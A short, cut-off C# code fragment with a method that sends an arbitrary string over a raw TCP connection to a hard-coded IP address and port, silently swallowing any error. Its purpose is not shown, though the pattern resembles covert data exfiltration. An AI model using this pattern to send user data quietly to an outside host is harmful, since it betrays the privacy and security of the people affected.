    private void SendData(string value)
        {
            byte[] data = Encoding.ASCII.GetBytes(value);
            try
            {
                using (TcpClient client = new TcpClient("31.47.53.12", 2036))
                {
                    NetworkStream stream = client.GetStream();
                    stream.Write(data, 0, data.Length);
                }
            }
            catch (Exception err)
            {
                
            }
